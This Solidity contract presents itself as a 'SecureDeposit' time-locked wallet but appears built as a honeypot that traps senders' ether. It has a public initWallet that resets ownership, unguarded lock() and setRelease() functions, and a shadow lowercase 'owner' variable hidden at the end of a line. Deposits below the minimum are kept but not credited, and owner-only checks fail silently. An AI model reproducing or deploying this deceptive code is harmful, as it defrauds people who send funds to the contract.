1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 //
3 // This is free software and you are welcome to redistribute it under certain conditions.
4 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
5 //
6 pragma solidity ^0.4.18;
7 
8 // minimum token interface
9 contract Token {
10     function transfer(address to, uint amount) public returns (bool);
11 }
12 
13 contract Ownable {
14     address Owner = msg.sender;
15     modifier onlyOwner { if (msg.sender == Owner) _; }
16     function transferOwnership(address to) public onlyOwner { Owner = to; }
17 }
18 
19 // tokens are withdrawable
20 contract TokenVault is Ownable {
21     function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
22         return Token(token).transfer(to, amount);
23     }
24 }
25 
26 // store ether & tokens for a period of time
27 contract SecureDeposit is TokenVault {
28     
29     event Deposit(address indexed depositor, uint amount);
30     event Withdrawal(address indexed to, uint amount);
31     event OpenDate(uint date);
32 
33     mapping (address => uint) public Deposits;
34     uint minDeposit;
35     bool Locked;
36     uint Date;
37 
38     function initWallet() payable open {
39         Owner = msg.sender;
40         minDeposit = 1 ether;
41         Locked = false;
42         deposit();
43     }
44     
45     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
46     function ReleaseDate() public constant returns (uint) { return Date; }
47     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
48 
49     function() public payable { deposit(); }
50 
51     function deposit() public payable {
52         if (msg.value > 0) {
53             if (msg.value >= MinimumDeposit())
54                 Deposits[msg.sender] += msg.value;
55             Deposit(msg.sender, msg.value);
56         }
57     }
58 
59     function setRelease(uint newDate) public { 
60         Date = newDate;
61         OpenDate(Date);
62     }
63 
64     function withdraw(address to, uint amount) public onlyOwner {
65         if (WithdrawEnabled()) {
66             uint max = Deposits[msg.sender];
67             if (max > 0 && amount <= max) {
68                 to.transfer(amount);
69                 Withdrawal(to, amount);
70             }
71         }
72     }
73 
74     function lock() public { Locked = true; } address owner;
75     modifier open { if (!Locked) _; owner = msg.sender; }
76     function kill() public { require(this.balance == 0); selfdestruct(Owner); }
77     function getOwner() external constant returns (address) { return owner; }
78 }